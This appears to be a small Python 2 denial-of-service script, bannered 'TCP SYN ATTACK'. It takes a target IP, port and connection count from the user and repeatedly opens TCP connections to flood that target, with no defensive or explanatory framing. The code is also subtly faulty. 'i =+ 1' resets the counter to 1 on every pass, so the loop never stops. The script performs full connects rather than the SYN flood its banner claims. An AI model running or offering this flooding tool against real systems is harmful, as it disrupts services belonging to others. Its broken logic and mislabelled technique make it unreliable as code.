#!/usr/bin/env python
print (" _______ _____ _____     _______     ___   _          _______ _______       _____ _  __\n"
       " |__   __/ ____|  __ \   / ____\ \   / / \ | |      /\|__   __|__   __|/\   / ____| |/ /\n"
       "    | | | |    | |__) | | (___  \ \_/ /|  \| |     /  \  | |     | |  /  \ | |    | ' / \n"
       "    | | | |    |  ___/   \___ \  \   / | . ` |    / /\ \ | |     | | / /\ \| |    |  <  \n"
       "    | | | |____| |       ____) |  | |  | |\  |   / ____ \| |     | |/ ____ \ |____| . \ \n"
       "    |_|  \_____|_|      |_____/   |_|  |_| \_|  /_/    \_\_|     |_/_/    \_\_____|_|\_\\\n"
       "                                                                                        ")

import socket

IP = raw_input("IP : ")
PORT = int(input("port : "))
nb_conexion = int(input("number of connexion : "))
i = 0

while (i < nb_conexion):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    s.close()
    i =+ 1
    if (i%10 == 0):
        print(i, " connexions")
print("attack over")
